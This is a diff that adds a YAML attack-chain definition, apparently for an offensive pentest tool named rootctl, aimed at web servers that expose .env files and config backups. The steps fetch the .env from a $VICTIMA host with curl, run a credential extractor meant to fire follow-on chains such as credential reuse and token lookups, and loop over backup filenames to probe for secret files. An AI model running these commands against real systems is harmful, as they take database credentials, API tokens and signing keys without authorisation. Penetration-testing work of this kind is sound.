@@ -1,0 +1,39 @@
+chain_id: env_file_exposed
+title: "Web — exposed .env / config backup"
+severity: CRITICAL
+tags: [web, env, config-disclosure, source-disclosure]
+
+trigger:
+  any_of:
+    - { path_pattern: "(?i)/(\\.env|\\.env\\.[a-z]+|config\\.json|wp-config\\.php\\.(bak|swp|old)|appsettings\\.json|database\\.yml)$" }
+    - { path_in: ["/.env", "/.env.local", "/wp-config.php.bak", "/config.json", "/appsettings.json", "/database.yml"] }
+
+description: |
+  An application config file leaked through the web server. .env files
+  and config backups carry DB credentials, API tokens, JWT signing keys,
+  S3 buckets — everything rootctl's extractors are tuned to recognize.
+  Pull the file and let the extractors light up downstream chains.
+
+steps:
+  - id: 1
+    title: "Pull the file"
+    command: curl -s http://$VICTIMA/.env -o env.dump
+
+  - id: 2
+    title: "Triage with rootctl"
+    command: rootctl extract env.dump
+    notes: |
+      Will fire credential_reuse, dsn_url_credentials, github_token
+      lookup, and aws_s3_bucket_check downstream as appropriate.
+
+  - id: 3
+    title: "If the response looks empty, also try common backup suffixes"
+    command: |
+      for f in .env .env.bak .env.local wp-config.php.bak wp-config.php.swp \
+               config.json appsettings.json database.yml secrets.yaml; do
+        echo "== $f =="
+        curl -s -o /dev/null -w '%{http_code}\\n' http://$VICTIMA/$f
+      done
+
+references:
+  - https://book.hacktricks.xyz/pentesting-web/file-inclusion
